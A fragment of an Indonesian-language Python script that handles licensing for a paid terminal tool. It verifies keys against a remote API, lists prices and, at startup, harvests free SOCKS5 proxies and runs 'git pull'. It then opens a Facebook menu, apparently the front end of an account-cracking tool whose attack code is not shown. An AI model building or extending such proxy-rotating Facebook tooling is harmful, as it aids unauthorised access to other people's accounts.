            prints(Panel(f'''{P2}[{H2}✓{P2}] selamat lisensi yang anda masukan terdaftar ke server kami''',width=80,padding=(0,1),style=f"light_steel_blue"))
            sleep(3) ; self.chekData() ; sys.exit()
       except KeyError as e:
            prints(Panel(f'''{P2}[{M2}!{P2}] opshh lisensi yang anda masukan tidak terdaftar di server''',width=80,padding=(0,1),style=f"light_steel_blue"))
            sleep(3) ; sys.exit()
       except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as e:
            prints(Panel(f'''{P2}[{M2}!{P2}] koneksi internet kamu hilang pastikan terhubung dengan WiFi ya''',width=80,padding=(0,1),style=f"light_steel_blue"))
            sleep(3) ; sys.exit()
   
   #- Harga Lisensi -#
   def Harga(self):
       prints(Panel(f'''{P2}[{H2}01{P2}]. lisensi 1 minggu 50.000 max pemakaian 1 device\n{P2}[{H2}02{P2}]. lisensi 1 bulan 100.000 max pemakaian 5 device\n{P2}[{H2}03{P2}]. permanen open source 250.000 full update''',width=80,padding=(0,1),style=f"light_steel_blue"))
       bool = Console().input(f'  {P2}[{H2}?{P2}] masukan pilihan : ')
       if bool =='' or bool =='':prints(Panel(f'''{P2}[{M2}!{P2}] opshhhh silahkan masukan pilihan yang tersedia di atas ya''',width=80,padding=(0,1),style=f"light_steel_blue"));sleep(3) ; self.pasteLisen()
       elif bool =='1' or bool =='01':self.WhatsApp() ; sleep(3) ; self.pasteLisen()
       elif bool =='2' or bool =='02':self.WhatsApp() ; sleep(3) ; self.pasteLisen()
       elif bool =='3' or bool =='03':self.WhatsApp() ; sleep(3) ; self.pasteLisen()
       else:prints(Panel(f'''{P2}[{M2}!{P2}] opshhhh silahkan masukan pilihan yang tersedia di atas ya''',width=80,padding=(0,1),style=f"light_steel_blue")); sleep(3) ; self.pasteLisen()

   #- Check Data Lisensi -#
   def chekData(self):
       self.clearTerminal(platform) ; self.Logooo()
       urut = []
       try:
            b = self.ses.get(f"{self.url}/api/key/Activate?token={self.token}&ProductId={self.ProductId}&Key={open('data/.LisensiLog.json','r').read()}").json()
            c        = b['licenseKey']
            key      = c['key'][0:11]
            tahun    = c['expires'][0:4]
            buln     = c['expires'][5:7]
            tanggal  = c['expires'][8:10]
            bulan    = self.bulan_ttl[buln]
            tahun1   = c['created'][0:4]
            buln1    = c['created'][5:7]
            tanggal1 = c['created'][8:10]
            bulan1   = self.bulan_ttl[buln1]
       except:
            key       = "-"
            tanggal   = "-"
            bulan     = "-"
            tahun     = "-"
            tanggal1  = "-"
            bulan1    = "-"
            tahun1    = "-"
       urut.append(Panel(f'''{P2}[{H2}*{P2}] lisensi : {H2}{key}-****-****\n{P2}[{H2}*{P2}] join    : {H2}{tanggal1} {bulan1} {tahun1}\n{P2}[{H2}*{P2}] expired : {H2}{tanggal} {bulan} {tahun}''',padding=(0,1), style="light_steel_blue"))
       Console(width=70,style="light_steel_blue").print(Columns(urut),justify="center")
       sleep(3) ; prints(Panel(f'''{P2}[{H2}+{P2}] silahkan jalankan ulang scriptnya dengan ketik python run.py''',width=80,padding=(0,1),style=f"light_steel_blue"))

   #- Check Lisensi Aktif & Nonaktif -#
   def ChekingLisensi(self):
       try:
           research = open("data/.LisensiLog.json","r").read()
       except FileNotFoundError as e:
           self.removeLisensi() ; self.pasteLisen()
       try:
           research = self.ses.get(f'''{self.url}/api/key/Activate?token={self.token}&ProductId={self.ProductId}&Key={research}''').json()['licenseKey']['key']
           sleep(3) ; Facebook().Menuu()
       except KeyError as e:
           prints(Panel(f'''{P2}[{M2}!{P2}] opshhh lisensi yang kamu miliki sudah kedaluwarsa''',width=80,padding=(0,1),style=f"light_steel_blue"))
           self.removeLisensi() ; sleep(3) ; self.WhatsApp()
   
   #- Check Lisensi -#
   def Chekinn_(self):
       try:
           xcTeam = open("data/.LisensiLog.json","r").read()
       except FileNotFoundError as e : self.pasteLisen()
       self.clearTerminal(platform)    ; self.ChekingLisensi()

if __name__=='__main__':
	try:
	    proxy = requests.Session().get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all")
	    open('data/proxies.txt','w').write(proxy.text)
	    os.system("git pull") ; Lisensi().Chekinn_()
	except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError) as e:
	    prints(Panel(f'{P2}Koneksi kamu buruk pastikan terhubung dengan internet atau WiFi ya',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; sys.exit()
